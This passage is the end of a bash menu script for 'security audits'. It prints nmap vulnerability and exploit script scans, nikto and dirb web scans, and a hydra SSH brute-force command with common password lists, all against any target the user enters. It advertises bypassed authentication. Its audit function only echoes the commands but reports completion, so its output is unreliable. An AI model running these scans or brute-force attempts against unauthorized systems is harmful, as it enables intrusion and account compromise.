            echo -e "${GREEN}[+] Running full security audit${RESET}"
            echo -e "${YELLOW}    Command: nmap -sV -sC -O -p- --script=vuln,exploit,auth,default $target -oA $output_dir/nmap_scan${RESET}"
            echo -e "${YELLOW}    Command: nikto -h $target -o $output_dir/nikto_scan.txt${RESET}"
            echo -e "${YELLOW}    Command: dirb http://$target -o $output_dir/dirb_scan.txt${RESET}"
            echo -e "${YELLOW}    Command: hydra -L common_users.txt -P common_passwords.txt $target ssh -t 4 -o $output_dir/ssh_brute.txt${RESET}"
            ;;
        "webapp")
            echo -e "${GREEN}[+] Running web application security audit${RESET}"
            echo -e "${YELLOW}    Command: nmap -sV --script=http-*,ssl-* $target -oA $output_dir/nmap_webapp_scan${RESET}"
            echo -e "${YELLOW}    Command: nikto -h $target -o $output_dir/nikto_scan.txt${RESET}"
            echo -e "${YELLOW}    Command: dirb http://$target -o $output_dir/dirb_scan.txt${RESET}"
            ;;
        "network")
            echo -e "${GREEN}[+] Running network security audit${RESET}"
            echo -e "${YELLOW}    Command: nmap -sV -sC -O -p- $target -oA $output_dir/nmap_network_scan${RESET}"
            echo -e "${YELLOW}    Command: hydra -L common_users.txt -P common_passwords.txt $target ssh -t 4 -o $output_dir/ssh_brute.txt${RESET}"
            echo -e "${YELLOW}    Command: nmap --script=smb-vuln* $target -oN $output_dir/smb_vulns.txt${RESET}"
            ;;
        "quick")
            echo -e "${GREEN}[+] Running quick security audit${RESET}"
            echo -e "${YELLOW}    Command: nmap -sV -F --script=vuln $target -oA $output_dir/nmap_quick_scan${RESET}"
            ;;
        *)
            echo -e "${GREEN}[+] Running default security audit${RESET}"
            echo -e "${YELLOW}    Command: nmap -sV -sC -O $target -oA $output_dir/nmap_default_scan${RESET}"
            ;;
    esac
    
    echo -e "${GREEN}[+] Results will be saved to directory: $output_dir${RESET}"
    echo -e "${CYAN}[*] Security audit completed!${RESET}"
}

# Automated security scan menu
automated_security_scan_menu() {
    display_banner
    
    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
    echo -e "${BLUE}│${MAGENTA}                AUTOMATED SECURITY SCANNER               ${BLUE}│${RESET}"
    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}Vulnerability Scan ${WHITE}(${CYAN}Quick${WHITE})${RESET}                        ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}Comprehensive Vulnerability Assessment${RESET}                ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}Web Application Security Audit${RESET}                       ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}4${WHITE}]${RESET} │ ${YELLOW}Network Security Audit${RESET}                               ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}5${WHITE}]${RESET} │ ${YELLOW}Full Security Assessment ${WHITE}(${CYAN}Combined Scans${WHITE})${RESET}          ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
    
    echo -e "${CYAN}[+] No-Auth Mode: Security scans will run with default parameters${RESET}"
    echo -e "${GREEN}[+] Authentication prompts will be automatically bypassed${RESET}"
    read -p "$(echo -e $YELLOW"[?] Select a scan type [0-5]: "$RESET)" scan_choice
    
    if [[ $scan_choice -eq 0 || $scan_choice -eq 6 ]]; then
        main_menu
        return
    fi
    
    read -p "$(echo -e $YELLOW"[?] Enter target IP or hostname: "$RESET)" target
    read -p "$(echo -e $YELLOW"[?] Enter output file name (default: auto_scan_results.txt): "$RESET)" output_file
    output_file=${output_file:-"auto_scan_results.txt"}
    
    case $scan_choice in
        1)
            run_vulnerability_scan "$target" "basic" "$output_file"
            ;;
        2)
            run_vulnerability_scan "$target" "comprehensive" "$output_file"
            ;;
        3)
            run_security_audit "$target" "webapp" "webapp_audit_$target"
            ;;
        4)
            run_security_audit "$target" "network" "network_audit_$target"
            ;;
        5)
            run_security_audit "$target" "full" "full_audit_$target"
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            automated_security_scan_menu
            return
            ;;
    esac
    
    echo
    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
    automated_security_scan_menu
}

# Start the main menu
main_menu
